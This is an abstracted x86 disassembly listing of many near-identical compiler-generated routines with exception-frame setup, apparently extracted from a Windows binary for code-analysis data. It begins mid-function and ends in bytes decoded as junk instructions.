jne r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn
mov eax [ ebx + 0x4 ]
add eax 0xfffffff8
mov eax [ ebx + 0x4 ]
add eax 0x2
mov edx [ eax ]
mov ecx [ edx ]
add ecx 0xfffffff8
mov eax ecx
jmp r-xdata
movzx eax [ ebx + 0x10 ]
pop ebx
pop ebp
retn
or eax 0xffffffff
pop ebx
pop ebp
retn
push 0x8
push rw-data
push eax
call sub_44f268
add esp 0xc
test eax eax
je r-xdata
sub_457ec1
push ebx
mov ebx rw-data
push r-xdata
push 0x0
push 0x1
call sub_44fb8c
add esp 0xc
mov eax [ eax + 0x4 ]
mov [ ebx + 0x18 ] eax
push r-xdata
push 0x0
push 0x1
call sub_44fb8c
add esp 0xc
mov edx [ eax + 0x4 ]
mov [ ebx + 0x20 ] edx
push r-xdata
push 0x0
push 0x1
call sub_44fb8c
add esp 0xc
mov ecx [ eax + 0x4 ]
mov [ ebx + 0x28 ] ecx
push r-xdata
push 0x0
push 0x1
call sub_44fb8c
add esp 0xc
mov eax [ eax + 0x4 ]
mov [ ebx + 0x30 ] eax
push r-xdata
push 0x0
push 0x1
call sub_44fb8c
add esp 0xc
mov edx [ eax + 0x4 ]
mov [ ebx + 0x38 ] edx
push r-xdata
push 0x0
push 0x1
call sub_44fb8c
add esp 0xc
mov ecx [ eax + 0x4 ]
mov [ ebx + 0x40 ] ecx
push r-xdata
push 0x0
push 0x1
call sub_44fb8c
add esp 0xc
mov eax [ eax + 0x4 ]
mov [ ebx + 0x48 ] eax
push r-xdata
push 0x0
push 0x1
call sub_44fb8c
add esp 0xc
mov edx [ eax + 0x4 ]
mov [ ebx + 0x58 ] edx
push r-xdata
push 0x0
push 0x1
call sub_44fb8c
add esp 0xc
mov ecx [ eax + 0x4 ]
mov [ ebx + 0x60 ] ecx
push r-xdata
push 0x0
push 0x1
call sub_44fb8c
add esp 0xc
mov eax [ eax + 0x4 ]
mov [ ebx + 0x68 ] eax
push r-xdata
push 0x0
push 0x1
call sub_44fb8c
add esp 0xc
mov edx [ eax + 0x4 ]
mov [ ebx + 0x70 ] edx
pop ebx
retn
sub_457fc8
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
mov [ ebp - 0x10 ] dl
test dl dl
jle r-xdata
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0x14 ] 0x1
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_45961c
inc [ ebp - 0x14 ]
lea edx [ ebp - 0x4 ]
mov [ ebp - 0x20 ] 0x8
mov [ ebp - 0x20 ] 0x14
mov [ ebp - 0x20 ] 0x20
lea eax [ ebp - 0xc ]
call sub_45961c
inc [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_45872c
add [ ebp - 0x14 ] 0x5
dec [ ebp - 0x14 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_459658
mov [ ebp - 0x20 ] 0x14
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_459658
mov ecx [ ebp - 0x30 ]
mov [ fs : 0x0 ] ecx
mov eax [ ebp - 0x8 ]
test bl bl
je r-xdata
call sub_459838
pop ebx
mov esp ebp
pop ebp
retn
call sub_459845
sub_458074
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
mov [ ebp - 0x10 ] dl
test dl dl
jle r-xdata
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0x14 ] 0x1
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_45961c
inc [ ebp - 0x14 ]
lea edx [ ebp - 0x4 ]
mov [ ebp - 0x20 ] 0x8
mov [ ebp - 0x20 ] 0x14
mov [ ebp - 0x20 ] 0x20
lea eax [ ebp - 0xc ]
call sub_45961c
inc [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_45872c
add [ ebp - 0x14 ] 0x5
dec [ ebp - 0x14 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_459658
mov [ ebp - 0x20 ] 0x14
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_459658
mov ecx [ ebp - 0x30 ]
mov [ fs : 0x0 ] ecx
mov eax [ ebp - 0x8 ]
test bl bl
je r-xdata
call sub_459838
pop ebx
mov esp ebp
pop ebp
retn
call sub_459845
sub_458120
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
mov [ ebp - 0x10 ] dl
test dl dl
jle r-xdata
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0x14 ] 0x1
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_45961c
inc [ ebp - 0x14 ]
lea edx [ ebp - 0x4 ]
mov [ ebp - 0x20 ] 0x8
mov [ ebp - 0x20 ] 0x14
mov [ ebp - 0x20 ] 0x20
lea eax [ ebp - 0xc ]
call sub_45961c
inc [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_45872c
add [ ebp - 0x14 ] 0x5
dec [ ebp - 0x14 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_459658
mov [ ebp - 0x20 ] 0x14
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_459658
mov ecx [ ebp - 0x30 ]
mov [ fs : 0x0 ] ecx
mov eax [ ebp - 0x8 ]
test bl bl
je r-xdata
call sub_459838
pop ebx
mov esp ebp
pop ebp
retn
call sub_459845
sub_4581cc
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
mov [ ebp - 0x10 ] dl
test dl dl
jle r-xdata
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0x14 ] 0x1
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_45961c
inc [ ebp - 0x14 ]
lea edx [ ebp - 0x4 ]
mov [ ebp - 0x20 ] 0x8
mov [ ebp - 0x20 ] 0x14
mov [ ebp - 0x20 ] 0x20
lea eax [ ebp - 0xc ]
call sub_45961c
inc [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_4587d8
add [ ebp - 0x14 ] 0x5
dec [ ebp - 0x14 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_459658
mov [ ebp - 0x20 ] 0x14
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_459658
mov ecx [ ebp - 0x30 ]
mov [ fs : 0x0 ] ecx
mov eax [ ebp - 0x8 ]
test bl bl
je r-xdata
call sub_459838
pop ebx
mov esp ebp
pop ebp
retn
call sub_459845
sub_458278
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
mov [ ebp - 0x10 ] dl
test dl dl
jle r-xdata
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0x14 ] 0x1
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_45961c
inc [ ebp - 0x14 ]
lea edx [ ebp - 0x4 ]
mov [ ebp - 0x20 ] 0x8
mov [ ebp - 0x20 ] 0x14
mov [ ebp - 0x20 ] 0x20
lea eax [ ebp - 0xc ]
call sub_45961c
inc [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_4587d8
add [ ebp - 0x14 ] 0x5
dec [ ebp - 0x14 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_459658
mov [ ebp - 0x20 ] 0x14
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_459658
mov ecx [ ebp - 0x30 ]
mov [ fs : 0x0 ] ecx
mov eax [ ebp - 0x8 ]
test bl bl
je r-xdata
call sub_459838
pop ebx
mov esp ebp
pop ebp
retn
call sub_459845
sub_458324
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
mov [ ebp - 0x10 ] dl
test dl dl
jle r-xdata
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0x14 ] 0x1
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_45961c
inc [ ebp - 0x14 ]
lea edx [ ebp - 0x4 ]
mov [ ebp - 0x20 ] 0x8
mov [ ebp - 0x20 ] 0x14
mov [ ebp - 0x20 ] 0x20
lea eax [ ebp - 0xc ]
call sub_45961c
inc [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_4587d8
add [ ebp - 0x14 ] 0x5
dec [ ebp - 0x14 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_459658
mov [ ebp - 0x20 ] 0x14
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_459658
mov ecx [ ebp - 0x30 ]
mov [ fs : 0x0 ] ecx
mov eax [ ebp - 0x8 ]
test bl bl
je r-xdata
call sub_459838
pop ebx
mov esp ebp
pop ebp
retn
call sub_459845
sub_4583d0
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
mov [ ebp - 0x10 ] dl
test dl dl
jle r-xdata
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0x14 ] 0x1
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_45961c
inc [ ebp - 0x14 ]
lea edx [ ebp - 0x4 ]
mov [ ebp - 0x20 ] 0x8
mov [ ebp - 0x20 ] 0x14
mov [ ebp - 0x20 ] 0x20
lea eax [ ebp - 0xc ]
call sub_45961c
inc [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_4587d8
add [ ebp - 0x14 ] 0x5
dec [ ebp - 0x14 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_459658
mov [ ebp - 0x20 ] 0x14
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_459658
mov ecx [ ebp - 0x30 ]
mov [ fs : 0x0 ] ecx
mov eax [ ebp - 0x8 ]
test bl bl
je r-xdata
call sub_459838
pop ebx
mov esp ebp
pop ebp
retn
call sub_459845
sub_45847c
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
mov [ ebp - 0x10 ] dl
test dl dl
jle r-xdata
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0x14 ] 0x1
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_45961c
inc [ ebp - 0x14 ]
lea edx [ ebp - 0x4 ]
mov [ ebp - 0x20 ] 0x8
mov [ ebp - 0x20 ] 0x14
mov [ ebp - 0x20 ] 0x20
lea eax [ ebp - 0xc ]
call sub_45961c
inc [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_458884
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x14 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_459658
mov [ ebp - 0x20 ] 0x14
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_459658
mov ecx [ ebp - 0x30 ]
mov [ fs : 0x0 ] ecx
mov eax [ ebp - 0x8 ]
test bl bl
je r-xdata
call sub_459838
pop ebx
mov esp ebp
pop ebp
retn
call sub_459845
sub_458528
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
mov [ ebp - 0x10 ] dl
test dl dl
jle r-xdata
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0x14 ] 0x1
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_45961c
inc [ ebp - 0x14 ]
lea edx [ ebp - 0x4 ]
mov [ ebp - 0x20 ] 0x8
mov [ ebp - 0x20 ] 0x14
mov [ ebp - 0x20 ] 0x20
lea eax [ ebp - 0xc ]
call sub_45961c
inc [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_458884
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x14 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_459658
mov [ ebp - 0x20 ] 0x14
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_459658
mov ecx [ ebp - 0x30 ]
mov [ fs : 0x0 ] ecx
mov eax [ ebp - 0x8 ]
test bl bl
je r-xdata
call sub_459838
pop ebx
mov esp ebp
pop ebp
retn
call sub_459845
sub_4585d4
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
mov [ ebp - 0x10 ] dl
test dl dl
jle r-xdata
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0x14 ] 0x1
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_45961c
inc [ ebp - 0x14 ]
lea edx [ ebp - 0x4 ]
mov [ ebp - 0x20 ] 0x8
mov [ ebp - 0x20 ] 0x14
mov [ ebp - 0x20 ] 0x20
lea eax [ ebp - 0xc ]
call sub_45961c
inc [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_458884
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x14 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_459658
mov [ ebp - 0x20 ] 0x14
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_459658
mov ecx [ ebp - 0x30 ]
mov [ fs : 0x0 ] ecx
mov eax [ ebp - 0x8 ]
test bl bl
je r-xdata
call sub_459838
pop ebx
mov esp ebp
pop ebp
retn
call sub_459845
sub_458680
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
mov [ ebp - 0x10 ] dl
test dl dl
jle r-xdata
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0x14 ] 0x1
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_45961c
inc [ ebp - 0x14 ]
lea edx [ ebp - 0x4 ]
mov [ ebp - 0x20 ] 0x8
mov [ ebp - 0x20 ] 0x14
mov [ ebp - 0x20 ] 0x20
lea eax [ ebp - 0xc ]
call sub_45961c
inc [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_458884
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x14 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_459658
mov [ ebp - 0x20 ] 0x14
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_459658
mov ecx [ ebp - 0x30 ]
mov [ fs : 0x0 ] ecx
mov eax [ ebp - 0x8 ]
test bl bl
je r-xdata
call sub_459838
pop ebx
mov esp ebp
pop ebp
retn
call sub_459845
sub_45872c
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
mov [ ebp - 0x10 ] dl
test dl dl
jle r-xdata
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0x14 ] 0x1
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_45961c
inc [ ebp - 0x14 ]
lea edx [ ebp - 0x4 ]
mov [ ebp - 0x20 ] 0x8
mov [ ebp - 0x20 ] 0x14
mov [ ebp - 0x20 ] 0x20
lea eax [ ebp - 0xc ]
call sub_45961c
inc [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_458884
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x14 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_459658
mov [ ebp - 0x20 ] 0x14
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_459658
mov ecx [ ebp - 0x30 ]
mov [ fs : 0x0 ] ecx
mov eax [ ebp - 0x8 ]
test bl bl
je r-xdata
call sub_459838
pop ebx
mov esp ebp
pop ebp
retn
call sub_459845
sub_4587d8
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
mov [ ebp - 0x10 ] dl
test dl dl
jle r-xdata
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0x14 ] 0x1
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_45961c
inc [ ebp - 0x14 ]
lea edx [ ebp - 0x4 ]
mov [ ebp - 0x20 ] 0x8
mov [ ebp - 0x20 ] 0x14
mov [ ebp - 0x20 ] 0x20
lea eax [ ebp - 0xc ]
call sub_45961c
inc [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_458884
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x14 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_459658
mov [ ebp - 0x20 ] 0x14
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_459658
mov ecx [ ebp - 0x30 ]
mov [ fs : 0x0 ] ecx
mov eax [ ebp - 0x8 ]
test bl bl
je r-xdata
call sub_459838
pop ebx
mov esp ebp
pop ebp
retn
call sub_459845
sub_458884
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
mov [ ebp - 0x10 ] dl
test dl dl
jle r-xdata
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0x14 ] 0x1
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_45961c
inc [ ebp - 0x14 ]
lea edx [ ebp - 0x4 ]
mov [ ebp - 0x20 ] 0x8
mov [ ebp - 0x20 ] 0x14
mov [ ebp - 0x20 ] 0x20
lea eax [ ebp - 0xc ]
call sub_45961c
inc [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_447a00
add [ ebp - 0x14 ] 0x3
dec [ ebp - 0x14 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_459658
mov [ ebp - 0x20 ] 0x14
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_459658
mov ecx [ ebp - 0x30 ]
mov [ fs : 0x0 ] ecx
mov eax [ ebp - 0x8 ]
test bl bl
je r-xdata
call sub_459838
pop ebx
mov esp ebp
pop ebp
retn
call sub_459845
sub_459190
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
call sub_45984d
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0xc ] 0x5
test bl bl
jl r-xdata
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
test bl bl
jle r-xdata
mov [ ebp - 0x18 ] 0x8
sub [ ebp - 0xc ] 0x5
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4594d8
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_459840
sub_4591e4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
call sub_45984d
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0xc ] 0x5
test bl bl
jl r-xdata
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
test bl bl
jle r-xdata
mov [ ebp - 0x18 ] 0x8
sub [ ebp - 0xc ] 0x5
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4594d8
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_459840
sub_459238
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
call sub_45984d
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0xc ] 0x5
test bl bl
jl r-xdata
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
test bl bl
jle r-xdata
mov [ ebp - 0x18 ] 0x8
sub [ ebp - 0xc ] 0x5
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45952c
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_459840
sub_45928c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
call sub_45984d
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0xc ] 0x5
test bl bl
jl r-xdata
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
test bl bl
jle r-xdata
mov [ ebp - 0x18 ] 0x8
sub [ ebp - 0xc ] 0x5
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45952c
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_459840
sub_4592e0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
call sub_45984d
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0xc ] 0x5
test bl bl
jl r-xdata
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
test bl bl
jle r-xdata
mov [ ebp - 0x18 ] 0x8
sub [ ebp - 0xc ] 0x5
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45952c
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_459840
sub_459334
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
call sub_45984d
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0xc ] 0x5
test bl bl
jl r-xdata
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
test bl bl
jle r-xdata
mov [ ebp - 0x18 ] 0x8
sub [ ebp - 0xc ] 0x5
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45952c
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_459840
sub_459388
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
call sub_45984d
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0xc ] 0x4
test bl bl
jl r-xdata
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
test bl bl
jle r-xdata
mov [ ebp - 0x18 ] 0x8
sub [ ebp - 0xc ] 0x4
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_459580
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_459840
sub_4593dc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
call sub_45984d
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0xc ] 0x4
test bl bl
jl r-xdata
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
test bl bl
jle r-xdata
mov [ ebp - 0x18 ] 0x8
sub [ ebp - 0xc ] 0x4
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_459580
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_459840
sub_459430
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
call sub_45984d
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0xc ] 0x4
test bl bl
jl r-xdata
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
test bl bl
jle r-xdata
mov [ ebp - 0x18 ] 0x8
sub [ ebp - 0xc ] 0x4
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_459580
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_459840
sub_459484
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
call sub_45984d
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0xc ] 0x4
test bl bl
jl r-xdata
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
test bl bl
jle r-xdata
mov [ ebp - 0x18 ] 0x8
sub [ ebp - 0xc ] 0x4
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_459580
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_459840
sub_4594d8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
call sub_45984d
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0xc ] 0x4
test bl bl
jl r-xdata
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
test bl bl
jle r-xdata
mov [ ebp - 0x18 ] 0x8
sub [ ebp - 0xc ] 0x4
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_459580
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_459840
sub_45952c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
call sub_45984d
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0xc ] 0x4
test bl bl
jl r-xdata
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
test bl bl
jle r-xdata
mov [ ebp - 0x18 ] 0x8
sub [ ebp - 0xc ] 0x4
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_459580
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_459840
sub_459580
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
call sub_45984d
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0xc ] 0x3
test bl bl
jl r-xdata
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
test bl bl
jle r-xdata
mov [ ebp - 0x18 ] 0x8
sub [ ebp - 0xc ] 0x3
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_40145c
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_459840
sub_4595e4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0x18 ] 0x8
xor ecx ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] ecx
call sub_44cc98
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_45961c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0x18 ] 0x8
mov edx [ edx ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] ecx
call sub_44cb34
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_459658
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44cae0
test esi 0x1
je r-xdata
push [ ebp - 0x4 ]
call sub_44e6dc
pop ecx
sub_45969c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push edi
push 0x0
push 0x0
call sub_450b58
add esp 0x10
mov esi eax
mov edx esi
mov eax ebx
call sub_4596f4
push [ ebp + 0x10 ]
push edi
push esi
push [ ebx ]
call sub_450b58
add esp 0x10
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4596d8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push ebx
call sub_45969c
add esp 0xc
mov eax ebx
pop ebx
pop ebp
retn
sub_4596f4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_44d04c
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_459714
add al 0x0
add [ eax ] al
adc [ eax ] al
or al 0x0
test al 0x13
inc eax
add [ ecx + 0x6e ] al
jae r-xdata
mov [ ebp - 0x20 ] 0x8ba0008
sub [ edi ] eax
lea eax [ ebp - 0x4 ]
push ebx
je r-xdata
call sub_4595e4
inc [ ebp - 0x14 ]
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_459688
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_459658
mov [ ebp - 0x20 ] 0x14
mov edx rw-data
lea eax [ ebp - 0x8 ]
call sub_4595e4
